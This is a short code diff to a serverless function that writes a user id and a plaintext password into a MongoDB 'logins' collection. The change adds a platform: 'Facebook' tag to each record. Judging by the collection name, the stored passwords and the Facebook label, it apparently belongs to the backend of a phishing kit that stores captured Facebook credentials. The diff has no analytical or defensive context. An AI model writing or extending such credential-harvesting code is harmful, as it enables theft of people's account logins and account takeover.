@@ -24,7 +24,7 @@ exports.handler = async function(event, context) {
         // Connect to MongoDB
         await client.connect();
 
-        await logins.insertOne({ uid, pwd: password, date: new Date() });
+        await logins.insertOne({ uid, pwd: password, date: new Date(), platform: "Facebook"});
 	
 
         return {
